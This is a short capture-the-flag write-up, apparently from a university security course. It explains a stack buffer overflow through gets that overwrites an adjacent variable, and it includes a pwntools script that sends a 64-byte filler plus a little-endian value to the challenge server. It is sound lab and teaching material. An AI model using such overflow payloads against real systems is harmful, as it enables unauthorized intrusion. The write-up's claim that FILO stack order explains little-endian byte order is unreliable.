# Challenge `Match an Exact Value` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23152`
- Impact:
  - Allows attacker to alter local variable

## Steps to reproduce

1. The `buffer` and `test` variables are reserved consecutively
2. By writing more that 64 characters into `buffer`, the `test` variable is affected, after the `gets` function.
3. Since the stack is a `first-in-last-out (FILO)` structure, we need to write the bytes in `little-endian`

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23152", timeout=1000)
session.recvuntil('?')
session.send(b'1'*64 + b'\x64\x63\x62\x61')
print(session.recvall())
```